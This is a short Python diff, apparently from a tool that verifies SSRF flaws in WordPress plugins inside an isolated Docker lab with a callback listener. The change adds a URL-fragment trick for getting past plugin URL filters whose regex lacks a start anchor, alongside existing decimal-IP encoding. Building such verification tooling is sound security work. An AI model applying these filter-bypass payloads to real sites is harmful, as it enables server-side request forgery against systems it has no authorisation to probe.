@@ -3911,6 +3911,7 @@ def verify_wordpress_ssrf(
     extra_setup_trigger_paths: Optional[list] = None,
     shortcode_name: Optional[str] = None,
     keep_lab_on_failure: bool = False,
+    url_bypass_fragment: str = "",
 ) -> WpVerifyResult:
     """Verifica SSRF levantando un contenedor 'callback' en la MISMA red Docker del laboratorio
     (no expuesto a internet, solo alcanzable desde dentro) y apuntando el parametro de URL/fichero
@@ -3960,7 +3961,15 @@ def verify_wordpress_ssrf(
 
         def build_urls(tok: str) -> List[str]:
             path = f"binoracle-ssrf-{tok}"
-            urls = [f"http://{lab.listener}:8080/{path}"]
+            base = f"http://{lab.listener}:8080/{path}"
+            urls = [base]
+            # bypass de fragmento: algunos endpoints tienen un filtro de URL que rechaza
+            # la URL del listener directamente pero no comprueban el fragmento; el fragmento
+            # (#...) es ignorado por wp_remote_get al construir la peticion HTTP pero si
+            # aparece en la cadena que evalua el regex del plugin -- util cuando el regex
+            # no tiene ancla inicial y acepta el patron en cualquier posicion.
+            if url_bypass_fragment:
+                urls.append(f"{base}{url_bypass_fragment}")
             if listener_ip:
                 parts = [int(x) for x in listener_ip.split(".")]
                 dec = (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3]
